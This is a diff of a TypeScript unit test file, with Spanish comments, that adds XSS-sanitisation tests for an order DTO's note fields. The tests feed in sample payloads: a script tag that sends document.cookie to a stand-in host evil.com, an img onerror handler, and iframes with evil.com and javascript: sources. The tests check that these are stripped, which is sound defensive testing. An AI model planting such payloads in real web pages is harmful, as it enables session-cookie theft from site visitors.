@@ -1,4 +1,3 @@
-// ⚠️ IMPORTANTE: Esta línea debe ir SIEMPRE primero para que funcionen los decoradores de class-validator
 import 'reflect-metadata';
 
 import { validate } from 'class-validator';
@@ -25,7 +24,7 @@ describe('CrearPedidoDto - Validación de Observaciones (BL-41)', () => {
       const itemErrors = errors
         .find((e) => e.property === 'items')
         ?.children?.[0]?.children?.find((c) => c.property === 'observacion');
-      
+
       expect(itemErrors).toBeUndefined();
     });
 
@@ -38,7 +37,7 @@ describe('CrearPedidoDto - Validación de Observaciones (BL-41)', () => {
       const itemErrors = errors
         .find((e) => e.property === 'items')
         ?.children?.[0]?.children?.find((c) => c.property === 'observacion');
-      
+
       expect(itemErrors).toBeDefined();
       expect(itemErrors?.constraints?.maxLength).toBe(
         'La nota del ítem no puede exceder 300 caracteres',
@@ -65,7 +64,7 @@ describe('CrearPedidoDto - Validación de Observaciones (BL-41)', () => {
       });
       const errors = await validate(dto);
       const generalErrors = errors.find((e) => e.property === 'observacionGeneral');
-      
+
       expect(generalErrors).toBeUndefined();
     });
 
@@ -76,7 +75,7 @@ describe('CrearPedidoDto - Validación de Observaciones (BL-41)', () => {
       });
       const errors = await validate(dto);
       const generalErrors = errors.find((e) => e.property === 'observacionGeneral');
-      
+
       expect(generalErrors).toBeDefined();
       expect(generalErrors?.constraints?.maxLength).toBe(
         'La nota general del pedido no puede exceder 500 caracteres',
@@ -92,6 +91,65 @@ describe('CrearPedidoDto - Validación de Observaciones (BL-41)', () => {
         observacionGeneral: '',
       });
       expect(await validate(dtoVacio)).toHaveLength(0);
+    });
+  });
+
+  describe('Sanitización de observaciones (prevención XSS)', () => {
+    it('debe eliminar etiquetas HTML de la observación del ítem', async () => {
+      const dto = plainToInstance(CrearPedidoDto, {
+        ...baseDto,
+        items: [
+          {
+            ...baseDto.items[0],
+            observacion: '<script>alert("xss")</script>Texto normal<b>negrita</b>',
+          },
+        ],
+      });
+
+      const errors = await validate(dto);
+      expect(errors.filter((e) => e.property === 'items')).toHaveLength(0);
+
+      // La transformación debe haber eliminado <script>, </script>, <b> y </b>
+      expect(dto.items[0].observacion).toBe('alert("xss")Texto normalnegrita');
+    });
+
+    it('debe eliminar etiquetas HTML de la observación general', async () => {
+      const dto = plainToInstance(CrearPedidoDto, {
+        ...baseDto,
+        observacionGeneral: '<iframe src="evil.com"></iframe>Alergia al maní',
+      });
+
+      const errors = await validate(dto);
+      expect(errors.filter((e) => e.property === 'observacionGeneral')).toHaveLength(0);
+
+      expect(dto.observacionGeneral).toBe('Alergia al maní');
+    });
+
+    it('debe eliminar scripts, iframes y etiquetas peligrosas', async () => {
+      const payloadMalicioso =
+        '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>' +
+        '<img src=x onerror=alert(1)>' +
+        '<iframe src="javascript:alert(1)"></iframe>' +
+        'Texto legítimo';
+
+      const dto = plainToInstance(CrearPedidoDto, {
+        ...baseDto,
+        items: [{ ...baseDto.items[0], observacion: payloadMalicioso }],
+      });
+
+      expect(dto.items[0].observacion).not.toContain('<script>');
+      expect(dto.items[0].observacion).not.toContain('<iframe');
+      expect(dto.items[0].observacion).not.toContain('onerror');
+      expect(dto.items[0].observacion).toContain('Texto legítimo');
+    });
+
+    it('debe manejar correctamente valores undefined y null', async () => {
+      const dtoSinObservaciones = plainToInstance(CrearPedidoDto, baseDto);
+      const errors = await validate(dtoSinObservaciones);
+      expect(errors).toHaveLength(0);
+
+      expect(dtoSinObservaciones.items[0].observacion).toBeUndefined();
+      expect(dtoSinObservaciones.observacionGeneral).toBeUndefined();
     });
   });
 });
